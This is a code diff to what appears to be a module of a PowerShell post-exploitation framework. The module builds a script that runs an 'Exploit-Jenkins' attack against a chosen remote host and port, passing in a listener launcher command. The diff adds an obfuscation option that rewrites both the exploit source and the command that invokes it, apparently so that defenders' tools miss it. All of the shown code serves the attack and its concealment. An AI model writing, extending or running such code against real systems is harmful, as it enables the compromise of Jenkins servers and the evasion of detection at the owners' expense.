@@ -82,7 +82,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         # extract all of our options
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
@@ -102,7 +102,9 @@ class Module:
         
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/exploitation/Exploit-Jenkins.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -114,9 +116,11 @@ class Module:
 
         script = moduleCode
 
-        script += "\nExploit-Jenkins"
-        script += " -Rhost "+str(self.options['Rhost']['Value'])
-        script += " -Port "+str(self.options['Port']['Value'])
-        script += " -Cmd \"" + launcher + "\""
-
+        scriptEnd = "\nExploit-Jenkins"
+        scriptEnd += " -Rhost "+str(self.options['Rhost']['Value'])
+        scriptEnd += " -Port "+str(self.options['Port']['Value'])
+        scriptEnd += " -Cmd \"" + launcher + "\""
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
